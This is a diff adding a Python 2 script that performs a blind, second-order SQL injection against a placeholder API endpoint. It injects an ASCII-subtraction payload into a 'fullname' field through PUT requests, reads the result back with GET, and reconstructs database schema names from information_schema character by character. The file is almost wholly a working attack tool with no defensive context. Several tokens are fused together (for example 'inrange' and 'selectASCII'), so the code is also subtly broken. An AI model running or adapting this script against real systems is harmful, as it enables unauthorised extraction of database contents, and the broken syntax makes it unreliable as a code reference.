@@ -1,0 +1,53 @@
+import requests
+
+rheaders = {} # Request headers
+
+rcookies = {} # Request cookies
+
+url = 'https://<target>/api/v1/' # Vulnerable endpoint
+
+len = 1000 # length of the string (using 1000 assuming thatit won't be more than that, going out of the string length will return 0 atthat moment we know that we got the full string)
+
+column = 'schema_name' # what to return
+
+table = 'information_schema.schemata' # from what
+
+orderby = 'schema_name'
+
+d=''
+
+start = 0
+
+end = 20
+
+for l in range(start,end):
+
+        limit = l
+
+        print'Retrieving '+column+' at row ' + str(limit+1) + '...'
+
+        if l > start and d == '':
+
+                break
+
+        d=''
+
+        for i inrange(1,len):
+
+                 r =requests.put(url, json={"fullname":"' - (selectASCII(substr("+column+","+str(i)+")) from"+table+" order by "+orderby+" limit "+str(limit)+",1)#"},headers=rheaders,cookies=rcookies)
+
+                 b =requests.get(url,cookies=rcookies).content.split('fullname":"',1)[1][:5]# Get the returned value
+
+                 n =filter(lambda b:b>='0' and b<='9', b)
+
+                 d +=chr(int(n)) # Convert ASCII number to equivalent character
+
+ 
+
+                #print d
+
+                 if n== '0':
+
+                  print column + ' at row ' + str(limit+1)+' :- ', d
+
+                  break
